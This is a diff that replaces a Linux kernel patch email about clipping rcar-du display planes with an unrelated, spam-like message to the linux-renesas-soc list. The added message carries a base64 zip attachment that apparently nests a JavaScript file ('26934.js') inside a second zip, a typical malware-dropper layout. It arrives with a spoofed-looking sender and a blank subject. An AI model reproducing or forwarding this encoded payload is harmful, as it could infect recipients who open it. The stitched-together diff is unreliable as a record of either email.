@@ -1,228 +1,190 @@
-Return-Path: <linux-renesas-soc-owner@vger.kernel.org>
-Received: from galahad.ideasonboard.com ([185.26.127.97]:38515 "EHLO
-        galahad.ideasonboard.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752048AbdHOXDT (ORCPT
+Return-Path: <SRS0=Q0X2=7G=vger.kernel.org=linux-renesas-soc-owner@vergenet.net>
+Received: from homeuser47-225.ccl.perm.ru ([62.16.47.225]:42606 "HELO perm.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751272AbdHDT4o (ORCPT
         <rfc822;linux-renesas-soc@vger.kernel.org>);
-        Tue, 15 Aug 2017 19:03:19 -0400
-From: Laurent Pinchart <laurent.pinchart+renesas@ideasonboard.com>
-To: dri-devel@lists.freedesktop.org
-Cc: linux-renesas-soc@vger.kernel.org
-Subject: [PATCH 3/3] drm: rcar-du: Clip planes to screen boundaries
-Date: Wed, 16 Aug 2017 02:03:38 +0300
-Message-Id: <20170815230338.14913-4-laurent.pinchart+renesas@ideasonboard.com>
-In-Reply-To: <20170815230338.14913-1-laurent.pinchart+renesas@ideasonboard.com>
-References: <20170815230338.14913-1-laurent.pinchart+renesas@ideasonboard.com>
+        Fri, 4 Aug 2017 15:56:44 -0400
+Content-Transfer-Encoding: base64
+From: <lfredric@callutheran.edu>
+To: <linux-renesas-soc@vger.kernel.org>
+Date: Fri, 04 Aug 2017 19:56:33 -0000
+MIME-Version: 1.0
+Content-Disposition: attachment
+Message-ID: <150187659363.17373.14528626080277163893@perm.ru>
+Subject: 
+Content-Type: application/zip; name="INFO_1538251785_linux-renesas-soc.zip"
 Sender: linux-renesas-soc-owner@vger.kernel.org
 List-ID: <linux-renesas-soc.vger.kernel.org>
 
-Unlike the KMS API, the hardware doesn't support planes exceeding the
-screen boundaries. Clip plane coordinates to support the use case.
-
-Signed-off-by: Laurent Pinchart <laurent.pinchart+renesas@ideasonboard.com>
----
- drivers/gpu/drm/rcar-du/rcar_du_plane.c | 66 +++++++++++++++++++++++++--------
- drivers/gpu/drm/rcar-du/rcar_du_plane.h |  4 ++
- drivers/gpu/drm/rcar-du/rcar_du_vsp.c   | 21 +++++++----
- 3 files changed, 67 insertions(+), 24 deletions(-)
-
-diff --git a/drivers/gpu/drm/rcar-du/rcar_du_plane.c b/drivers/gpu/drm/rcar-du/rcar_du_plane.c
-index 714e02960635..7944790bac25 100644
---- a/drivers/gpu/drm/rcar-du/rcar_du_plane.c
-+++ b/drivers/gpu/drm/rcar-du/rcar_du_plane.c
-@@ -19,6 +19,7 @@
- #include <drm/drm_fb_cma_helper.h>
- #include <drm/drm_gem_cma_helper.h>
- #include <drm/drm_plane_helper.h>
-+#include <drm/drm_rect.h>
- 
- #include "rcar_du_drv.h"
- #include "rcar_du_group.h"
-@@ -329,11 +330,39 @@ static void rcar_du_plane_write(struct rcar_du_group *rgrp,
- 		      data);
- }
- 
-+void rcar_du_plane_clip(const struct drm_plane_state *state,
-+			struct drm_rect *src, struct drm_rect *dst)
-+{
-+	const struct drm_display_mode *mode;
-+
-+	/*
-+	 * The hardware requires all planes to be fully contained in the output
-+	 * rectangle. Crop the destination rectangle to fit in the CRTC.
-+	 */
-+	mode = &state->crtc->state->adjusted_mode;
-+
-+	dst->x1 = max(0, state->crtc_x);
-+	dst->y1 = max(0, state->crtc_y);
-+	dst->x2 = min_t(unsigned int, mode->hdisplay,
-+			state->crtc_x + state->crtc_w);
-+	dst->y2 = min_t(unsigned int, mode->vdisplay,
-+			state->crtc_y + state->crtc_h);
-+
-+	/*
-+	 * Offset the left and top source coordinates by the same displacement
-+	 * we have applied to the destination rectangle. Copy the width and
-+	 * height as the hardware can't scale.
-+	 */
-+	src->x1 = (state->src_x >> 16) + (dst->x1 - state->crtc_x);
-+	src->y1 = (state->src_y >> 16) + (dst->y1 - state->crtc_y);
-+	src->x2 = src->x1 + (dst->x2 - dst->x1);
-+	src->y2 = src->y1 + (dst->y2 - dst->y1);
-+}
-+
- static void rcar_du_plane_setup_scanout(struct rcar_du_group *rgrp,
--					const struct rcar_du_plane_state *state)
-+					const struct rcar_du_plane_state *state,
-+					const struct drm_rect *src)
- {
--	unsigned int src_x = state->state.src_x >> 16;
--	unsigned int src_y = state->state.src_y >> 16;
- 	unsigned int index = state->hwindex;
- 	unsigned int pitch;
- 	bool interlaced;
-@@ -357,7 +386,7 @@ static void rcar_du_plane_setup_scanout(struct rcar_du_group *rgrp,
- 			dma[i] = gem->paddr + fb->offsets[i];
- 		}
- 	} else {
--		pitch = state->state.src_w >> 16;
-+		pitch = drm_rect_width(&state->state.src);
- 		dma[0] = 0;
- 		dma[1] = 0;
- 	}
-@@ -383,8 +412,8 @@ static void rcar_du_plane_setup_scanout(struct rcar_du_group *rgrp,
- 	 * require a halved Y position value, in both progressive and interlaced
- 	 * modes.
- 	 */
--	rcar_du_plane_write(rgrp, index, PnSPXR, src_x);
--	rcar_du_plane_write(rgrp, index, PnSPYR, src_y *
-+	rcar_du_plane_write(rgrp, index, PnSPXR, src->x1);
-+	rcar_du_plane_write(rgrp, index, PnSPYR, src->y1 *
- 			    (!interlaced && state->format->bpp == 32 ? 2 : 1));
- 
- 	rcar_du_plane_write(rgrp, index, PnDSA0R, dma[0]);
-@@ -394,8 +423,8 @@ static void rcar_du_plane_setup_scanout(struct rcar_du_group *rgrp,
- 
- 		rcar_du_plane_write(rgrp, index, PnMWR, pitch);
- 
--		rcar_du_plane_write(rgrp, index, PnSPXR, src_x);
--		rcar_du_plane_write(rgrp, index, PnSPYR, src_y *
-+		rcar_du_plane_write(rgrp, index, PnSPXR, src->x1);
-+		rcar_du_plane_write(rgrp, index, PnSPYR, src->y1 *
- 				    (state->format->bpp == 16 ? 2 : 1) / 2);
- 
- 		rcar_du_plane_write(rgrp, index, PnDSA0R, dma[1]);
-@@ -518,7 +547,8 @@ static void rcar_du_plane_setup_format_gen3(struct rcar_du_group *rgrp,
- 
- static void rcar_du_plane_setup_format(struct rcar_du_group *rgrp,
- 				       unsigned int index,
--				       const struct rcar_du_plane_state *state)
-+				       const struct rcar_du_plane_state *state,
-+				       const struct drm_rect *dst)
- {
- 	struct rcar_du_device *rcdu = rgrp->dev;
- 
-@@ -528,10 +558,10 @@ static void rcar_du_plane_setup_format(struct rcar_du_group *rgrp,
- 		rcar_du_plane_setup_format_gen3(rgrp, index, state);
- 
- 	/* Destination position and size */
--	rcar_du_plane_write(rgrp, index, PnDSXR, state->state.crtc_w);
--	rcar_du_plane_write(rgrp, index, PnDSYR, state->state.crtc_h);
--	rcar_du_plane_write(rgrp, index, PnDPXR, state->state.crtc_x);
--	rcar_du_plane_write(rgrp, index, PnDPYR, state->state.crtc_y);
-+	rcar_du_plane_write(rgrp, index, PnDSXR, drm_rect_width(dst));
-+	rcar_du_plane_write(rgrp, index, PnDSYR, drm_rect_height(dst));
-+	rcar_du_plane_write(rgrp, index, PnDPXR, dst->x1);
-+	rcar_du_plane_write(rgrp, index, PnDPYR, dst->y1);
- 
- 	if (rcdu->info->gen < 3) {
- 		/* Wrap-around and blinking, disabled */
-@@ -546,14 +576,18 @@ void __rcar_du_plane_setup(struct rcar_du_group *rgrp,
- 			   const struct rcar_du_plane_state *state)
- {
- 	struct rcar_du_device *rcdu = rgrp->dev;
-+	struct drm_rect src;
-+	struct drm_rect dst;
-+
-+	rcar_du_plane_clip(&state->state, &src, &dst);
- 
--	rcar_du_plane_setup_format(rgrp, state->hwindex, state);
-+	rcar_du_plane_setup_format(rgrp, state->hwindex, state, &dst);
- 	if (state->format->planes == 2)
- 		rcar_du_plane_setup_format(rgrp, (state->hwindex + 1) % 8,
--					   state);
-+					   state, &dst);
- 
- 	if (rcdu->info->gen < 3)
--		rcar_du_plane_setup_scanout(rgrp, state);
-+		rcar_du_plane_setup_scanout(rgrp, state, &src);
- 
- 	if (state->source == RCAR_DU_PLANE_VSPD1) {
- 		unsigned int vspd1_sink = rgrp->index ? 2 : 0;
-diff --git a/drivers/gpu/drm/rcar-du/rcar_du_plane.h b/drivers/gpu/drm/rcar-du/rcar_du_plane.h
-index 890321b4665d..ec52a2af7cd4 100644
---- a/drivers/gpu/drm/rcar-du/rcar_du_plane.h
-+++ b/drivers/gpu/drm/rcar-du/rcar_du_plane.h
-@@ -17,6 +17,7 @@
- #include <drm/drmP.h>
- #include <drm/drm_crtc.h>
- 
-+struct drm_rect;
- struct rcar_du_format_info;
- struct rcar_du_group;
- 
-@@ -79,6 +80,9 @@ int __rcar_du_plane_atomic_check(struct drm_plane *plane,
- 
- int rcar_du_planes_init(struct rcar_du_group *rgrp);
- 
-+void rcar_du_plane_clip(const struct drm_plane_state *state,
-+			struct drm_rect *src, struct drm_rect *dst);
-+
- void __rcar_du_plane_setup(struct rcar_du_group *rgrp,
- 			   const struct rcar_du_plane_state *state);
- 
-diff --git a/drivers/gpu/drm/rcar-du/rcar_du_vsp.c b/drivers/gpu/drm/rcar-du/rcar_du_vsp.c
-index dd66dcb8da23..e62a8d7ee0c5 100644
---- a/drivers/gpu/drm/rcar-du/rcar_du_vsp.c
-+++ b/drivers/gpu/drm/rcar-du/rcar_du_vsp.c
-@@ -18,6 +18,7 @@
- #include <drm/drm_fb_cma_helper.h>
- #include <drm/drm_gem_cma_helper.h>
- #include <drm/drm_plane_helper.h>
-+#include <drm/drm_rect.h>
- 
- #include <linux/bitops.h>
- #include <linux/dma-mapping.h>
-@@ -176,17 +177,21 @@ static void rcar_du_vsp_plane_setup(struct rcar_du_vsp_plane *plane)
- 		.alpha = state->alpha,
- 		.zpos = state->state.zpos,
- 	};
-+	struct drm_rect src;
-+	struct drm_rect dst;
- 	unsigned int i;
- 
--	cfg.src.left = state->state.src_x >> 16;
--	cfg.src.top = state->state.src_y >> 16;
--	cfg.src.width = state->state.src_w >> 16;
--	cfg.src.height = state->state.src_h >> 16;
-+	rcar_du_plane_clip(&state->state, &src, &dst);
- 
--	cfg.dst.left = state->state.crtc_x;
--	cfg.dst.top = state->state.crtc_y;
--	cfg.dst.width = state->state.crtc_w;
--	cfg.dst.height = state->state.crtc_h;
-+	cfg.src.left = src.x1;
-+	cfg.src.top = src.y1;
-+	cfg.src.width = drm_rect_width(&src);
-+	cfg.src.height = drm_rect_height(&src);
-+
-+	cfg.dst.left = dst.x1;
-+	cfg.dst.top = dst.y1;
-+	cfg.dst.width = drm_rect_width(&dst);
-+	cfg.dst.height = drm_rect_height(&dst);
- 
- 	for (i = 0; i < state->format->planes; ++i)
- 		cfg.mem[i] = sg_dma_address(state->sg_tables[i].sgl)
--- 
-Regards,
-
-Laurent Pinchart
+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
